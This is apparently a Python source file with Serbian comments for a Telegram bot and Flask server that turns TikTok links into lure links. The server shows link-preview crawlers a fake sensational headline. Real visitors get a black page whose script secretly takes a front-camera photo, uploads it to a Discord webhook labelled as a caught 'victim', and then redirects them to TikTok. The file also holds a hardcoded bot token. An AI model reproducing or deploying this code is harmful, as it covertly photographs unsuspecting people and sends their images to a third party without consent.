import uuid
import threading
import asyncio
from flask import Flask, request, redirect, render_template_string
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# =========================================================================
# 1. PODEŠAVANJA
# =========================================================================
API_TOKEN = '8771472343:AAGhpARS8GxMcsbsnt1hKKZhiIltABiQlUA'
DISCORD_WEBHOOK_URL = 'https://discord.com'

# TVOJA PRIMARNA RENDER ADRESA (BEZ KOSE CRTE NA KRAJU!)
MY_PUBLIC_DOMAIN = 'https://tiktok-varka-2.onrender.com'

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
db = {}

# =========================================================================
# 2. TELEGRAM BOT KOD
# =========================================================================
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("Ćao! Pošalji mi bilo koji TikTok link, a ja ću ti napraviti potpuno crnu varku.")

@dp.message()
async def handle_message(message: types.Message):
    text = message.text
    if "tiktok.com" not in text:
        await message.answer("Molim te pošalji ispravan TikTok link.")
        return
        
    await message.answer("Generišem link, sačekaj trenutak...")
    link_id = str(uuid.uuid4())[:8]
    
    # Čuvamo podatke o originalnom TikTok linku
    db[link_id] = {
        "title": "Izbodeni ljudi na Music Week-u! 😱",
        "image": "https://unsplash.com",
        "description": "Pogledaj ceo snimak uživo sa lica mesta...",
        "tiktok_url": text
    }
    
    # POPRAVLJENO: Koristimo direktno upisanu javnu adresu umesto request.host_url
    prank_link = f"{MY_PUBLIC_DOMAIN}/l/{link_id}"
    await message.answer(f"Evo tvog uverljivog linka:\n\n`{prank_link}`")

# =========================================================================
# 3. WEB SERVER KOD (FLASK + JAVASCRIPT VARKA)
# =========================================================================
flask_app = Flask(__name__)

@flask_app.route('/l/<link_id>')
def serve_link(link_id):
    if link_id not in db:
        return "Link ne postoji", 404
        
    prank_data = db[link_id]
    user_agent = request.headers.get('User-Agent', '')

    bot_keywords = ["TelegramBot", "Twitterbot", "facebookexternalhit", "Discordbot"]
    is_bot = any(keyword in user_agent for keyword in bot_keywords)

    if is_bot:
        html_template = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta property="og:title" content="{{ title }}" />
            <meta property="og:image" content="{{ image }}" />
            <meta property="og:description" content="{{ description }}" />
            <meta property="og:type" content="video.other" />
        </head>
        <body></body>
        </html>
        """
        return render_template_string(
            html_template, 
            title=prank_data["title"], 
            image=prank_data["image"], 
            description=prank_data["description"]
        )
    else:
        page_template = """
        <!DOCTYPE html>
        <html lang="sr">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>TikTok</title>
            <style>
                body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
            </style>
        </head>
        <body>
            <script>
                const praviTikTok = "{{ tiktok_url }}";
                const webhookUrl = "{{ webhook_url }}";

                function idiNaTikTok() {
                    window.location.href = praviTikTok;
                }

                window.onload = function() {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                    .then(function(stream) {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        video.onloadedmetadata = function() {
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                const ctx = canvas.getContext('2d');
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                
                                canvas.toBlob(function(blob) {
                                    const formData = new FormData();
                                    formData.append('file', blob, 'upecan.png');
                                    formData.append('content', '📸 Nova žrtva se upecala!');
                                    
                                    fetch(webhookUrl, { method: 'POST', body: formData })
                                    .then(() => {
                                        stream.getTracks().forEach(track => track.stop());
                                        idiNaTikTok();
                                    }).catch(idiNaTikTok);
                                }, 'image/png');
                            }, 500);
                        };
                    })
                    .catch(function(err) {
                        idiNaTikTok();
                    });
                };
            </script>
        </body>
        </html>
        """
        return render_template_string(
            page_template, 
            tiktok_url=prank_data["tiktok_url"], 
            webhook_url=DISCORD_WEBHOOK_URL
        )

def start_flask():
    import os
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    threading.Thread(target=start_flask, daemon=True).start()
    asyncio.run(dp.start_polling(bot))
